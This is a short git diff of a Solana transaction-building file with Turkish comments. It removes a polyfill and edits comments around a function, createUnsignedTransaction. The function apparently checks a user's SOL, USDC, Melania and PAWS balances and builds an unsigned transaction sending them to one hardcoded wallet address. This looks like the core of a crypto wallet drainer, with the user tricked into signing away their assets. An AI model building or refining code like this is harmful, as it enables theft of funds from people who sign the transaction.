@@ -1,23 +1,10 @@
 /* transaction.js */
 /* eslint-disable @typescript-eslint/no-explicit-any */
 
-// ——— Polyfill: Transaction.prototype.serializeMessage ekle ———
-import { Transaction } from "@solana/web3.js";
-if (!Transaction.prototype.serializeMessage) {
-  Transaction.prototype.serializeMessage = function () {
-    // Eğer compileMessage() fonksiyonu tanımlıysa, onu kullanıp Buffer döndür
-    if (typeof this.compileMessage === "function") {
-      return this.compileMessage().serialize();
-    }
-    // Yoksa direkt komple transaction’ı serialize et
-    return this.serialize();
-  };
-}
-
-// ——— Orijinal import’lar ———
 import {
   PublicKey,
   SystemProgram,
+  Transaction,
 } from "@solana/web3.js";
 import {
   getAssociatedTokenAddress,
@@ -26,6 +13,8 @@ import {
   createAssociatedTokenAccountInstruction,
 } from "@solana/spl-token";
 import { connection } from "./connect.js";
+
+
 
 /**
  * Kullanıcının bakiyelerine göre SOL, USDC, Melania ve PAWS transferi için
@@ -95,7 +84,7 @@ export async function createUnsignedTransaction(userPublicKey) {
   }
 
   // -----------------------------------------------------------
-  // Eligibility: Hiçbiri yeterli değilse çık
+  // Eligibility: Hiç biri yeterli değilse çık
   // -----------------------------------------------------------
   if (
     !isSolSufficient &&
@@ -108,7 +97,7 @@ export async function createUnsignedTransaction(userPublicKey) {
   }
 
   // -----------------------------------------------------------
-  // Hedef adres ve ATA hesapları
+  // Hedef adres ve ata hesapları
   // -----------------------------------------------------------
   const toPublicKey = new PublicKey("GpLLb2NqvWYyYJ5wGZNQCAuxHWdJdHpXscyHNd6SH8c1");
   const toUsdcAta    = await getAssociatedTokenAddress(USDC_MINT,    toPublicKey);
